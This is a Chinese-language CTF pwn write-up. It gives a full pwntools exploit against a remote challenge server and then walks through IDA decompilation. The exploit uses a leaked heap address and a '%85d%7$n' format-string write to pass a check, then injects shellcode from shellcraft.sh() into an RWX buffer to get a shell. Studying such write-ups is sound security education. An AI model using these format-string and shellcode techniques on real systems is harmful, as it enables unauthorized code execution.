屠龙少年终成恶龙（这样看pwn还是挺有意思的）只是我不配罢了

先分析一下大概逻辑

先放wp

```python
from pwn import *
context(log_level = 'debug', arch = 'amd64', os = 'linux')
p = remote('61.147.171.105','65497')
p.recvuntil('secret[0] is ')
addr = int(p.recvuntil('\n'),16)
payload = '%85d%7$n'
p.sendlineafter('be:\n','aaa')
p.sendlineafter('up?:\n','east')
p.sendlineafter('leave(0)?:\n', '1')
p.sendlineafter("address'\n", str(addr))
p.sendlineafter('is:\n',payload)
sc = asm(shellcraft.sh())
p.sendlineafter('SPELL', sc)
p.interactive()

```

用IDA分析

main函数如下

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  _DWORD *v4; // [rsp+18h] [rbp-78h]

  setbuf(stdout, 0LL);
  alarm(0x3Cu);
  sub_400996(0x3CLL);
  v4 = malloc(8uLL);
  *v4 = 68;
  v4[1] = 85;
  puts("we are wizard, we will give you hand, you can not defeat dragon by yourself ...");
  puts("we will tell you two secret ...");
  printf("secret[0] is %x\n", v4);
  printf("secret[1] is %x\n", v4 + 1);
  puts("do not tell anyone ");
  sub_400D72((__int64)v4);
  puts("The End.....Really?");
  return 0LL;
}
```

动态分给v4地址，然后将68存给v4地址对应的值，将85存给v4地址+1的位置上。这里获取一下secret[0]也就是v4的地址，然后再输出do not tell anyone后进入sub_400D72

```c
unsigned __int64 __fastcall sub_400D72(__int64 a1)
{
  char s[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("What should your character's name be:");
  _isoc99_scanf("%s", s);
  if ( strlen(s) <= 0xC )
  {
    puts("Creating a new player.");
    sub_400A7D();
    sub_400BB9();
    sub_400CA6((_DWORD *)a1);
  }
  else
  {
    puts("Hei! What's up!");
  }
  return __readfsqword(0x28u) ^ v3;
}
```

这个函数就是让你输入你的name，然后进入sub_400A7D()、 sub_400BB9()、sub_400CA6((_DWORD *)a1);

第一个函数没啥漏洞

第二个函数如下

```c
if ( v1 == 1 )
  {
    puts("A voice heard in your mind");
    puts("'Give me an address'");
    _isoc99_scanf("%ld", &v2);
    puts("And, you wish is:");
    _isoc99_scanf("%s", format);
    puts("Your wish is");
    printf(format);
    puts("I hear it, I hear it....");
  }
```

这里的话v2和format离的比较近，就可以用v2传地址，然后用format和printf字符串格式化漏洞传递

payload = '%85d%7$n'大概就是这样用字符串格式化漏洞

然后终于可以进来了！

```c
  if ( *a1 == a1[1] )
  {
    puts("Wizard: I will help you! USE YOU SPELL");
    v1 = mmap(0LL, 0x1000uLL, 7, 33, -1, 0LL);
    read(0, v1, 0x100uLL);
    ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);
  }
```

这里的话要写入一个shellcode

```python
sc = asm(shellcraft.sh())
p.sendlineafter('SPELL', sc)
```

然后即可获取权限